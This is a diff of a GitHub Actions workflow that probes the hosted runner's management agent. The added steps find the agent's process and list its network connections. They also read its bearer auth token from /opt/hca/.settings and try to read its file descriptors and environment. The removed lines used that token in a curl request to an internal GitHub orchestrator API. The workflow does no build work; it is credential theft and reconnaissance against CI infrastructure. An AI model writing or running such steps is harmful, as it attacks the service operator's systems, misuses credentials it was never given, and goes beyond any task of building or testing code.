@@ -1,14 +1,36 @@
-name: Final
+name: HCA Connection Dump
 on:
   push:
     branches: [master]
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 3
+    timeout-minutes: 5
     steps:
-      - run: |
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Dump HCA connection
+        run: |
+          # Wait for HCA to establish
+          sleep 3
+          HCA_PID=$(pgrep -f hosted-compute-agent)
+          echo "HCA PID: $HCA_PID"
+          echo "=== HCA TCP connections ==="
+          ss -tnpa | grep $HCA_PID
+          echo ""
+          echo "=== Compare: our outgoing ==="
           TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
-          echo "RESULT_START"
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core sh -c "curl -sk --connect-timeout 10 -H 'Authorization: Bearer $TOK' -H 'Content-Type: application/json' -d '{\"planId\":\"test\"}' 'https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus'"
-          echo "RESULT_END"
+          
+          # Test with strace to see difference
+          echo "=== HCA connection details ==="
+          cat /proc/$HCA_PID/fd/7 2>/dev/null && echo "can read fd" || echo "cant read fd"
+          ls -la /proc/$HCA_PID/fd/7
+          
+          echo ""
+          echo "=== HCA env ==="
+          cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | grep -i proxy
+          
+          echo ""
+          echo "=== Check HTTP_PROXY env ==="
+          echo $http_proxy
+          echo $https_proxy
